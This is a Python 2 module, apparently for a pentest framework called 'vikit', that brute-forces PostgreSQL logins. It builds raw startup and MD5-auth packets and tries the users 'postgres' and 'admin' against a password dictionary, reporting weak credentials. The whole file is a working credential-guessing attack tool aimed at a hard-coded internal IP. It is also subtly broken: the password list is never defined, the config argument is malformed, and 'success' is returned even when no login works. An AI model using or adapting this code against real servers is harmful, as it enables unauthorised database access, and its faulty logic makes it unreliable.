#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<v1ll4n>
  Purpose: Mod
  Created: 05/21/17
"""

import time
import socket
import hashlib

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param


NAME = 'postgres_demo'

AUTHOR = 'vikit'

DESCRIPTION = 'description about a postgres crack'

RESULT_DESC = '''this description is about result!'''

DEMANDS = [TargetDemand('target', target.TYPE_IPV4),
           ParamDemand('port', param.TYPE_INT)]


def make_response(username, password, salt):
    pu = hashlib.md5(password + username).hexdigest()
    buf = hashlib.md5(pu + salt).hexdigest()
    return 'md5' + buf


def auth(host, port, username, password, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        packet_length = len(username) + 7 + len(
            "\x03user  database postgres application_name psql client_encoding UTF8  ")
        p = "%c%c%c%c%c\x03%c%cuser%c%s%cdatabase%cpostgres%capplication_name%cpsql%cclient_encoding%cUTF8%c%c" % (
        0, 0, 0, packet_length, 0, 0, 0, 0, username, 0, 0, 0, 0, 0, 0, 0, 0)
        sock.send(p)
        packet = sock.recv(1024)
        if packet[0] == 'R':
            authentication_type = str([packet[8]])
            c = int(authentication_type[4:6], 16)
            if c == 5: salt = packet[9:]
        else:
            return 3
        lmd5 = make_response(username, password, salt)
        packet_length1 = len(lmd5) + 5 + len('p')
        pp = 'p%c%c%c%c%s%c' % (0, 0, 0, packet_length1 - 1, lmd5, 0)
        sock.send(pp)
        packet1 = sock.recv(1024)
        if packet1[0] == "R":
            return True
    except Exception, e:
        if "Errno 10061" in str(e) or "timed out" in str(e): return 3


def check(ip, port, timeout):
    user_list = ['postgres', 'admin']
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            try:
                pass_ = str(pass_.replace('{user}', user))
                result = auth(ip, port, user, pass_, timeout)
                if result == 3: break
                if result == True: return u"存在弱口令，用户名：%s 密码：%s" % (user, pass_)
            except Exception, e:
                return False

#----------------------------------------------------------------------
def exploit(target, payload, config):
    
    timeout = 5
    port = 5432
    if config.has_key('port'):
        port=int(config['port'])

    if check(target, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit


if __name__ == '__main__':
    print exploit('192.168.1.183','',{'port:5432'})